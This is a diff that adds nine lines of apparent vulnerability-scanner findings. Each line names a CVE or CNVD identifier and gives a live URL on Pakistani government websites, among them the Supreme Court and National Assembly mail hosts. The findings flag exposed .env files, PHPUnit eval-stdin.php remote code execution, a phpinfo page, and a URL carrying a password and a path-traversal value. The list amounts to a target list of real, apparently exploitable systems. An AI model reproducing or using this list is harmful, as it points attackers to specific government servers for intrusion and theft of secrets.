@@ -1,0 +1,9 @@
+[CNVD-2020-23735] [http] [high] https://dev.mlc.gov.pk/backup/auto.php?password=NzbwpQSdbY06Dngnoteo2wdgiekm7j4N&path=../backup/auto.php
+[CVE-2017-16894] [http] [high] https://complaints.pob.gov.pk/.env
+[CVE-2017-9822] [http] [high] https://www.lesco.gov.pk/__
+[CVE-2017-9841] [http] [critical] https://estab-admin.gkp.pk/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[CVE-2017-9841] [http] [critical] https://lms.etpb.gov.pk/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[CVE-2018-20608] [http] [high] https://dev.mlc.gov.pk/imcat/root/tools/adbug/binfo.php?phpinfo1 [7.2.34]
+[CVE-2017-9841] [http] [critical] https://www.estab-admin.gkp.pk/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[CVE-2019-15858] [http] [high] https://www.supremecourt.gov.pk/wp-content/plugins/insert-php/readme.txt
+[CVE-2019-9670] [http] [critical] https://mail.nab.gov.pk/Autodiscover/Autodiscover.xml
